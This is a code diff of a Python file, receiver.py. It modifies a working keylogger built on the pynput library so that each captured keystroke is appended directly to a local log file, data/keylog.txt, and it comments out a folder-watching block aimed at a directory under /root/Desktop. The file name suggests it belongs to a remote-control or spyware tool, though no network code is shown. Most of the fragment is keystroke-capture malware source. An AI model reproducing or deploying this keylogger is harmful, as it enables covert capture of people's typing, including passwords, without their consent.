@@ -17,15 +17,17 @@ receiver.py
 import pynput.keyboard
 from pynput.keyboard import Key, Listener
 import logging
+import datetime
 
 
 def on_press(key):
-    logging.info(str(key))
+    with open(file=keylogger_log_path, mode='a') as file:
+        file.write(str(key))
 
 
 keylogger_active = False
 keylogger_log_path = "data/keylog.txt"
-logging.basicConfig(filename=keylogger_log_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+# logging.basicConfig(filename=keylogger_log_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 listener = Listener(on_press=on_press)
 
 
@@ -60,25 +62,25 @@ def stop_keylogger():
     return keylogger_log_path
 
 
-import sys
-import time
-import logging
-from watchdog.observers import Observer
-from watchdog.events import LoggingEventHandler
-
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO,
-                        format='%(asctime)s - %(message)s',
-                        datefmt='%Y-%m-%d %H:%M:%S')
-    # path = sys.argv[1] if len(sys.argv) > 1 else '.'
-    path = "/root/Desktop/write_test/"
-    event_handler = LoggingEventHandler()
-    observer = Observer()
-    observer.schedule(event_handler, path, recursive=True)
-    observer.start()
-    try:
-        while True:
-            time.sleep(1)
-    finally:
-        observer.stop()
-        observer.join()
+# import sys
+# import time
+# import logging
+# from watchdog.observers import Observer
+# from watchdog.events import LoggingEventHandler
+#
+# if __name__ == "__main__":
+#     logging.basicConfig(level=logging.INFO,
+#                         format='%(asctime)s - %(message)s',
+#                         datefmt='%Y-%m-%d %H:%M:%S')
+#     # path = sys.argv[1] if len(sys.argv) > 1 else '.'
+#     path = "/root/Desktop/write_test/"
+#     event_handler = LoggingEventHandler()
+#     observer = Observer()
+#     observer.schedule(event_handler, path, recursive=True)
+#     observer.start()
+#     try:
+#         while True:
+#             time.sleep(1)
+#     finally:
+#         observer.stop()
+#         observer.join()
